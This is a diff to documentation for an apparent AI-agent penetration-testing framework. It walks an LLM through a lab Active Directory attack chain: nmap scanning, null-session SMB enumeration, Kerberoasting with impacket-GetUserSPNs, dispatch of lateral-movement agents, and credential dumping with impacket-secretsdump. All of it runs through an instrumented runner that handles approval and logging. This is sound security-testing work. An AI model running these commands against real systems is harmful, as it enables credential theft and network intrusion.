@@ -83,28 +83,24 @@ Returns a list of offensive tools found on `$PATH` with version info. Missing to
 
 ### Nmap Scan
 
-The LLM validates and executes a port scan:
+The LLM uses the instrumented runner for validation, approval, lifecycle
+logging, evidence capture, and parser ingestion:
 
 ```
-→ Call validate_action with:
+→ Call run_tool with:
+  binary: "nmap"
+  args: ["-Pn", "-sT", "-oX", "-", "192.168.56.0/24"]
   description: "Full TCP port scan of 192.168.56.0/24"
   technique: "portscan"
+  target_cidr: "192.168.56.0/24"
+  parse_with: "nmap"
 ```
 
-Returns `action_id: "act-001"`, `valid: true`.
+The result includes `action_id: "act-001"`, the captured evidence reference,
+and the parse outcome. The parser receives output shaped like:
 
 ```
-→ Call log_action_event with:
-  action_id: "act-001"
-  event_type: "action_started"
-```
-
-The LLM runs nmap and parses the results:
-
-```
-→ Call parse_output with:
-  tool_name: "nmap"
-  output: "<?xml version='1.0'?>
+<?xml version='1.0'?>
     <nmaprun>
       <host><address addr='192.168.56.10'/><ports>
         <port portid='88'><state state='open'/><service name='kerberos-sec'/></port>
@@ -146,12 +142,6 @@ Inference rules fired automatically:
 - **Kerberos → Domain**: `svc-192-168-56-10-88` → `MEMBER_OF_DOMAIN` edge created
 - **MSSQL + Domain**: `svc-192-168-56-11-1433` → `POTENTIAL_AUTH` edges from future domain creds
 
-```
-→ Call log_action_event with:
-  action_id: "act-001"
-  event_type: "action_completed"
-```
-
 **Graph state:** 9 nodes, 9 edges (6 RUNS + 3 inferred), 12+ frontier items.
 
 **Dashboard:** Three host nodes appear with service clusters. Inferred edges shown as dashed lines.
@@ -175,15 +165,17 @@ The LLM scores them — SMB on the DC (56.10) is highest priority because Kerber
 ### NXC SMB Enumeration
 
 ```
-→ Call validate_action with:
+→ Call run_tool with:
+  binary: "nxc"
+  args: ["smb", "192.168.56.10", "--shares", "-u", "", "-p", ""]
   description: "SMB enumeration with null session on 192.168.56.10"
   target_node: "svc-192-168-56-10-445"
   technique: "smb_enum"
-
-→ Call log_action_event with action_id: "act-002", event_type: "action_started"
+  frontier_item_id: "fi-smb-192-168-56-10"
+  parse_with: "nxc"
 ```
 
-The LLM runs `nxc smb 192.168.56.10 --shares -u '' -p ''` and parses:
+The runner parses captured stdout. An equivalent parser input is:
 
 ```
 → Call parse_output with:
@@ -230,15 +222,19 @@ The LLM spots a Kerberoastable service account in the BloodHound data. Frontier 
 ### Execute Kerberoast
 
 ```
-→ Call validate_action with:
+→ Call run_tool with:
+  binary: "impacket-GetUserSPNs"
+  args: ["north.sevenkingdoms.local/operator", "-request"]
   description: "Kerberoast sql_svc on north.sevenkingdoms.local"
   target_node: "user-north-sql_svc"
   technique: "kerberoast"
-
-→ Call log_action_event with action_id: "act-005", event_type: "action_started"
+  frontier_item_id: "fi-kerberoast-sql-svc"
+  parse_with: "getuserspns"
 ```
 
-The LLM runs `impacket-GetUserSPNs` and gets a TGS hash. Then cracks it:
+The runner returns `action_id: "act-005"` and ingests the TGS hash. A later
+instrumented hashcat run can use `parse_with: "hashcat"`; if its captured output
+must be parsed separately, thread the returned action and frontier IDs:
 
 ```
 → Call parse_output with:
@@ -256,10 +252,6 @@ The LLM runs `impacket-GetUserSPNs` and gets a TGS hash. Then cracks it:
 
 - **Credential Fanout** → `POTENTIAL_AUTH` edges to every compatible service (SMB, MSSQL, WinRM)
 
-```
-→ Call log_action_event with action_id: "act-005", event_type: "action_completed"
-```
-
 **Graph state:** ~85 nodes, ~320 edges. New credential node with fan-out to all services.
 
 **Dashboard:** Credential node pulses briefly (new node animation). Amber `POTENTIAL_AUTH` edges fan out to multiple services.
@@ -268,19 +260,13 @@ The LLM runs `impacket-GetUserSPNs` and gets a TGS hash. Then cracks it:
 
 ### Agent Dispatch
 
-The frontier now shows `POTENTIAL_AUTH` edges to multiple services. The LLM dispatches sub-agents for parallel testing:
+The frontier now shows `POTENTIAL_AUTH` edges to multiple services. The LLM
+dispatches the two highest-value eligible items in parallel:
 
 ```
-→ Call register_agent with:
-  agent_id: "agent-lateral-smb"
-  frontier_item_id: "fi-potential-auth-sql-svc-445"
-  skill: "lateral-movement"
-```
-
-```
-→ Call register_agent with:
-  agent_id: "agent-lateral-mssql"
-  frontier_item_id: "fi-potential-auth-sql-svc-1433"
+→ Call dispatch_agents with:
+  count: 2
+  strategy: "top_priority"
   skill: "lateral-movement"
 ```
 
@@ -312,15 +298,17 @@ The primary session sees new frontier items from agent findings:
 ### Secretsdump
 
 ```
-→ Call validate_action with:
+→ Call run_tool with:
+  binary: "impacket-secretsdump"
+  args: ["north.sevenkingdoms.local/sql_svc@192.168.56.11"]
   description: "Secretsdump on 192.168.56.11 with sql_svc creds"
   target_node: "host-192-168-56-11"
   technique: "credential_dumping"
-
-→ Call log_action_event with action_id: "act-010", event_type: "action_started"
+  frontier_item_id: "fi-secretsdump-192-168-56-11"
+  parse_with: "secretsdump"
 ```
 
-The LLM runs `impacket-secretsdump` and parses:
+The instrumented runner captures and parses output such as:
 
 ```
 → Call parse_output with:
